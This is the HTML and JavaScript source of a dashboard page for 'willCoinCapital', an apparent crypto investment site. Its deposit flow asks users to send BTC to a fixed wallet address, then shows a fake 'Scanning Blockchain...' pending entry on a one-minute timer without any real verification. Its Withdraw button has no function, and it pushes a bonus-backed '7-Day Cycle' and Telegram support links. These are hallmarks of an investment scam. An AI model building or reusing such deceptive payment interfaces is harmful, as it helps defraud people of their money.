<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard | willCoinCapital</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { background:#000; font-family:'Plus Jakarta Sans',sans-serif; color: white; margin: 0; overflow-x: hidden; }
        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(12px); border:1px solid rgba(255,255,255,0.08);}
        .active-gradient { background: linear-gradient(135deg, rgba(34,211,238,0.1) 0%, rgba(0,0,0,0) 100%); border: 1px solid rgba(34,211,238,0.3); }
        
        /* Modal Backdrop */
        #depositModal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(10px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        /* Glowing UI Elements */
        .glow-button {
            box-shadow: 0 0 10px rgba(34, 211, 238, 0.2);
            animation: pulse-glow 2s infinite;
        }
        @keyframes pulse-glow {
            0%, 100% { box-shadow: 0 0 5px rgba(34, 211, 238, 0.2); }
            50% { box-shadow: 0 0 15px rgba(34, 211, 238, 0.5); }
        }

        /* Blockchain Verification Animation */
        .blink-pending {
            animation: blink 1.5s ease-in-out infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; color: #fbbf24; }
            50% { opacity: 0.3; color: #f59e0b; }
        }

        /* Floating Support Bubble */
        .float-support {
            position: fixed;
            bottom: 25px;
            right: 25px;
            z-index: 999;
            background: #22d3ee;
            color: black;
            padding: 12px 20px;
            border-radius: 50px;
            font-weight: 900;
            font-size: 10px;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            gap: 8px;
            box-shadow: 0 10px 20px rgba(34, 211, 238, 0.3);
            text-decoration: none;
        }

        input[type=range]::-webkit-slider-runnable-track { background: rgba(255,255,255,0.1); border-radius: 10px; height: 6px; }
    </style>
</head>
<body class="p-6 pb-24">

    <div id="depositModal">
        <div class="glass w-full max-w-sm rounded-[32px] p-8 border border-white/10 text-center">
            <div class="mb-6">
                <div class="w-16 h-16 bg-orange-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                    <svg width="32" height="32" viewBox="0 0 24 24" fill="#f7931a"><path d="M23.638 14.904c-1.602 6.43-8.113 10.34-14.542 8.736C2.67 22.05-1.244 15.525.362 9.105 1.962 2.67 8.471-1.24 14.914.364c6.421 1.591 10.321 8.117 8.724 14.54zM18.56 10.56c.293-1.954-1.195-3.005-3.23-3.706l.66-2.64-1.609-.4-.644 2.58c-.422-.106-.856-.207-1.29-.306l.65-2.604-1.61-.402-.66 2.646c-.35-.08-.691-.153-1.025-.23l.002-.01-2.22-.555-.427 1.715s1.195.273 1.17.29c.652.163.77.594.75 1.05l-.934 3.748c.056.014.129.035.21.067l-.21-.053-.572 2.3c-.08.198-.282.495-.738.38l-1.17-.292-.712 1.64 2.095.522c.39.097.772.2 1.15.295l-.67 2.69 1.61.401.663-2.662c.44.12.87.234 1.29.34l-.66 2.65 1.61.402.67-2.687c2.744.52 4.81.31 5.677-2.17.7-1.996-.035-3.146-1.475-3.897.8-.184 1.4-.71 1.562-1.797zm-2.793 3.918c-.497 2.0-3.864.92-4.955.648l.883-3.542c1.09.272 4.587.81 4.072 2.894zm.5-3.937c-.453 1.82-3.26.897-4.168.67l.802-3.215c.91.227 3.83.653 3.366 2.545z"/></svg>
                </div>
                <h3 class="text-xl font-black tracking-tighter uppercase">Bitcoin Deposit</h3>
                <p class="text-[10px] text-gray-500 font-bold uppercase tracking-widest mt-1">Copy address and send BTC</p>
            </div>

            <div class="bg-black/40 border border-white/5 rounded-2xl p-4 mb-6">
                <p id="walletAddr" class="text-[11px] font-mono text-gray-400 break-all mb-3 leading-relaxed">
                    Bc1qgf7ruqy6y8pkyzsspxq38j53puny0aprujph28
                </p>
                <button onclick="copyAddress()" class="w-full py-2 bg-white/5 hover:bg-white/10 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all">Copy Address</button>
            </div>

            <div class="space-y-3">
                <button onclick="handleDone()" class="w-full py-4 bg-cyan-400 text-black rounded-2xl font-black uppercase text-[11px] tracking-widest">DONE</button>
                <button onclick="closeModal()" class="w-full py-3 text-gray-500 font-black uppercase text-[9px] tracking-widest">Cancel</button>
            </div>
        </div>
    </div>

    <a href="https://t.me/willCoin_Capital" target="_blank" class="float-support active:scale-95 transition-all uppercase">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.02-1.96 1.25-5.54 3.69-.52.36-1 .53-1.42.52-.47-.01-1.37-.26-2.03-.48-.82-.27-1.47-.42-1.42-.88.03-.24.35-.49.96-.75 3.78-1.65 6.31-2.73 7.57-3.24 3.61-1.47 4.36-1.72 4.85-1.73.11 0 .35.03.51.16.13.11.17.26.19.37.02.12.02.26.01.38z"/></svg>
        Support
    </a>

    <nav class="flex justify-between items-center mb-8">
        <h1 class="font-black text-xl tracking-tighter text-white uppercase">WILLCOIN<span class="text-cyan-400">CAPITAL</span></h1>
        <button onclick="logoutUser()" class="glow-button px-4 py-2 rounded-full border border-cyan-400/30 text-[10px] font-black text-cyan-400 uppercase tracking-widest transition-all">Logout</button>
    </nav>

    <div id="activeInvestmentCard" class="hidden active-gradient rounded-[32px] p-7 mb-4 relative overflow-hidden">
        <div class="absolute top-0 right-0 p-4"><span class="flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-cyan-500"></span></span></div>
        <p class="text-cyan-400 text-[10px] font-black uppercase tracking-widest mb-1">Active Portfolio</p>
        <h2 id="activePowerDisplay" class="text-4xl font-extrabold tracking-tighter text-white">$0.00</h2>
    </div>

    <div class="glass rounded-[32px] p-7 mb-4">
        <p class="text-gray-400 text-[10px] font-black uppercase tracking-widest mb-1">Available Balance</p>
        <h2 id="balanceDisplay" class="text-5xl font-extrabold tracking-tighter text-white">$0.00</h2>
        <div class="flex gap-3 mt-6">
            <button onclick="openModal()" class="flex-1 bg-cyan-400 text-black py-4 rounded-2xl font-black text-[11px] uppercase tracking-widest active:scale-95 transition-all">Deposit</button>
            <button class="flex-1 bg-white/5 border border-white/10 py-4 rounded-2xl font-black text-[11px] uppercase tracking-widest active:scale-95 transition-all">Withdraw</button>
        </div>
    </div>

    <div class="glass rounded-[32px] p-7 mb-4">
        <div class="flex justify-between items-center mb-6">
            <h3 class="text-white font-black text-lg uppercase tracking-tighter">Invest</h3>
            <span class="bg-cyan-400/10 text-cyan-400 text-[9px] px-3 py-1.5 rounded-full font-black tracking-widest border border-cyan-400/20">+ $100 Bonus</span>
        </div>
        
        <div class="space-y-5">
            <input type="range" id="investSlider" min="500" max="20000" step="500" value="500" class="w-full h-1.5 bg-white/10 rounded-lg appearance-none cursor-pointer accent-cyan-400" oninput="updateInvestment(this.value)">
            <input type="number" id="manualInvest" placeholder="500.00" value="500" class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-5 text-sm font-bold outline-none text-white" oninput="updateInvestment(this.value)">
            
            <div class="flex gap-3">
                <button onclick="processInvestment()" class="flex-[2] py-5 bg-white text-black rounded-[20px] font-black uppercase text-[10px] tracking-widest active:scale-95 transition-all">Start 7-Day Cycle</button>
                <a href="https://t.me/+KG_gSPf8AHhkYjIx" target="_blank" class="flex-1 py-5 bg-white/5 border border-white/10 text-white rounded-[20px] font-black uppercase text-[10px] tracking-widest text-center no-underline flex items-center justify-center active:scale-95 transition-all">Enquiries</a>
            </div>
        </div>
    </div>

    <div class="glass rounded-[32px] p-7">
        <h3 class="text-white font-black text-lg uppercase tracking-tighter mb-5">History</h3>
        <div class="space-y-4" id="txHistory">
            <div class="flex justify-between items-center pb-4 border-b border-white/5">
                <div><p class="text-white font-bold text-sm">Signup Bonus</p><p class="text-gray-500 text-[10px] uppercase font-bold">Mar 2026</p></div>
                <p class="text-cyan-400 font-black text-sm">+$100.00</p>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDsY7hDvNEDq_8SE0XcHrgLU5e6kQxpMPA",
            authDomain: "willcoincapital.firebaseapp.com",
            projectId: "willcoincapital",
            storageBucket: "willcoincapital.firebasestorage.app",
            messagingSenderId: "241566024834",
            appId: "1:241566024834:web:75e0d771ca7eb9a5a3a09b",
            measurementId: "G-4VEL5JXYYL"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        const BTC_WALLET = "Bc1qgf7ruqy6y8pkyzsspxq38j53puny0aprujph28"; 

        // Modal Functions
        function openModal() { document.getElementById('depositModal').style.display = 'flex'; }
        function closeModal() { document.getElementById('depositModal').style.display = 'none'; }
        function copyAddress() { navigator.clipboard.writeText(BTC_WALLET); alert("Address copied to clipboard!"); }

        // Manual Deposit Flow
        function handleDone() {
            const amt = prompt("Confirm Amount Sent ($):");
            if (amt && !isNaN(amt)) {
                closeModal();
                alert("Deposit Logged. Awaiting network verification...");
                
                // Triggers the pending item after exactly 1 minute
                setTimeout(() => { 
                    const historyBox = document.getElementById('txHistory');
                    const newTx = document.createElement('div');
                    newTx.className = "flex justify-between items-center pb-4 border-b border-white/5";
                    newTx.innerHTML = `
                        <div>
                            <p class="text-white font-bold text-sm">Deposit Pending</p>
                            <p class="text-[9px] uppercase font-black blink-pending">Scanning Blockchain...</p>
                        </div>
                        <p class="text-gray-400 font-black text-sm">$${parseFloat(amt).toLocaleString()}</p>
                    `;
                    historyBox.insertBefore(newTx, historyBox.firstChild);
                }, 60000);
            }
        }

        // Dashboard State Management
        auth.onAuthStateChanged((user) => {
            if (user) {
                db.collection("users").doc(user.uid).onSnapshot((doc) => {
                    if (doc.exists) {
                        const data = doc.data();
                        document.getElementById("balanceDisplay").innerText = "$" + (data.balance || 0).toLocaleString(undefined, {minimumFractionDigits: 2});
                        if (data.activeInvestment > 0) {
                            document.getElementById("activeInvestmentCard").classList.remove("hidden");
                            document.getElementById("activePowerDisplay").innerText = "$" + data.activeInvestment.toLocaleString(undefined, {minimumFractionDigits: 2});
                        }
                    }
                });
            } else { window.location.href = "index.html"; }
        });

        function updateInvestment(val) {
            let amount = parseFloat(val) || 0;
            document.getElementById('investSlider').value = amount;
            document.getElementById('manualInvest').value = amount > 0 ? amount : '';
        }

        async function processInvestment() {
            const amount = parseFloat(document.getElementById('manualInvest').value) || 0;
            if (amount < 500) return alert("Minimum investment is $500.00");
            const user = auth.currentUser;
            const userDocRef = db.collection("users").doc(user.uid);
            const userDoc = await userDocRef.get();
            if (userDoc.data().balance < amount) return alert("Insufficient balance.");
            try {
                await userDocRef.update({
                    balance: firebase.firestore.FieldValue.increment(-amount),
                    activeInvestment: amount + 100
                });
                alert("7-Day Cycle Activated Successfully!");
            } catch (err) { alert(err.message); }
        }

        function logoutUser() {
            auth.signOut().then(() => { window.location.href = 'index.html'; });
        }
    </script>
</body>
</html>
